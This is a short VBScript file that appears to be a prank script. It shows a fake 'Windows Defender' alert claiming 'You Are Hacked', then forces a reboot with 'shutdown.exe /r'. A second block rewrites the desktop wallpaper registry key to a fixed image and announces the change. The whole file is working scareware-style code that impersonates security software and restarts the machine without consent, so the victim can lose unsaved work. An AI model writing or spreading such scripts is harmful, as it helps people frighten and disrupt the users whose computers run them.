
X=MsgBox("Windows Defender: You Are Hacked, HEHEHHE",2+48,"BOOM")
CreateObject("WScript.Shell").Run "shutdown.exe /r"




Public wscr
Public Const Wallpaper = "C:\Desktop\dnse\dnse.jpg"

Set wscr = CreateObject("WScript.Shell")

wscr.RegWrite "HKEY_CURRENT_USER\Control Panel\Desktop\Wallpaper", Wallpaper
wscr.Popup "Wallpaper Changed!"

Set wscr = Nothing



